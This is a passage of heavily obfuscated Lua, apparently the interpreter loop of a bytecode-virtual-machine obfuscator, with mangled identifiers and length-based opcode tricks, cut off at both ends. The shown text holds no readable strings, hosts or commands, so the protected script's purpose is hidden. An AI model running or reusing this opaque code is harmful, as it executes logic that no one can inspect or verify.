mU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gg")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("PDh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1T")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D4s")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tZtI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("R3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("vaG")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("o9")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("AIV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{621;582;878;587};{593;390;836;966};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Hou")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("YTV7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gF")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5Ck")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Vfyq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D6L")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("fQCL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fa")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j5T")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("eCWv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j6")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{107;449;319;316};{11;36;510;868};{948;162;604;727};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oF2z")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("bG")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("IzE")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ja")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("6X1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jPmX")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{15;893;174;343};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C8dn")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eF")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{158;428;722;471};"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("lIx6")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("c8W")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{25;360;710;969};"1 + 1 = 111";{959;332;416;132};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DV")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sT1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("JFMO")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("EQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("scF")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("2c82")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oo")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("rCV")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("s0vh")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DN")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Q2b")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("f2L9")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{238;218;151;866};{882;805;345;213};}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("UQ8")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{52;322;735;167};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LjO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5Q")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("PHm")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uf")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("vaa")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uN")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4PL")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Ge0s")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("I7v")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{80;966;9;903};{234;142;454;834};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sBU")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OdJF")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZIz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("z9l7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hP")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pB8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("umpM")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("eW")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("9OL")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6Q")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("e82")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZMe")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("UFoW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("B8Z")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("c1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fi")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("ueZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("ki")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("Avc")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("i9M")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6qiT")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("hvS")then local ajefa_IllIllll;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S7")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bPX")]]+ajefa_lllIIlIllIlIllllIIlIIlll[#("XlQY")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("eCU")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("W7")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0g")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fKe")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cYH0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{823;238;466;75};}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vD0")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ctfK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gy")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ty5")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("LP")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{{647;510;25;986};"1 + 1 = 111";{787;479;595;254};}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{543;270;225;247};}];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZBT")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hCqO")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("mD")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bn")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5VN")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tZou")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("K6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ajp")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Nbpv")];else if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nQ")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("x5ZT")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("kJ6")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("UP7V5q7")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("vj69V")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eo")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("DcS")];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("cNDrxX")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("A3")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ajY")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ntx0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kZ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Gly")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("VH")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("dKf")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{398;714;8;840};"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P2B")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("GPz5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pJ")]]~=ajefa_lllIIlIllIlIllllIIlIIlll[#("BAPh")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SbN")];end;else if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bY")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("EaEk")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("6oQ")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("As4UH7Zp")then local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("cG")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("neQ")]))elseif ajefa_IIIlIllIllllIIllIlllIIll>#("nWrAxSC8o")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ku")]]~=ajefa_lllIIlIllIlIllllIIlIIlll[#("87vG")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("CgJ")];end;else ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Do4")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4p")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("4LmoPDDOu82Z85O")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("vdayshoa6jSu")then if ajefa_IIIlIllIllllIIllIlllIIll==#("ulFd92Lndpq")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gs")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NWm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("aJlG")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kb")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("y2W")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ql")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("eyh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("isg")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gFv8")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIl